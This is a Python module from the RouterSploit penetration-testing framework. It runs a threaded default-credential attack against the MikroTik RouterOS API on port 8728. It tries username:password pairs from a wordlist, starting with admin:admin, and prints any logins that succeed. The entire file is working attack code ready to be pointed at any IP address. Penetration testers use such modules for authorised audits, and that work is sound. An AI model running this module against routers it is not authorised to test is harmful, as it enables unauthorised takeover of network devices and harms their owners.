from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient
from routersploit.libs.apiros.apiros_client import ApiRosClient


class Exploit(TCPClient):
    __info__ = {
        "name": "Mikrotik Default Creds - API ROS",
        "description": "",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Mikrotik Router",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(8728, "Target API port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, creds):
        while running.is_set():
            try:
                username, password = creds.next().split(":", 1)

                tcp_client = self.tcp_create()
                tcp_sock = tcp_client.connect()
                apiros = ApiRosClient(tcp_sock)

                output = apiros.login(username, password)

                if output[0][0] == "!done":
                    if self.stop_on_success:
                        running.clear()

                    print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                else:
                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

                tcp_client.close()

            except StopIteration:
                break

    def check(self):
        tcp_client = self.tcp_create()
        if tcp_client.connect():
            tcp_client.close()
            return True

        return False

    def check_default(self):
        self.credentials = []

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            return self.credentials
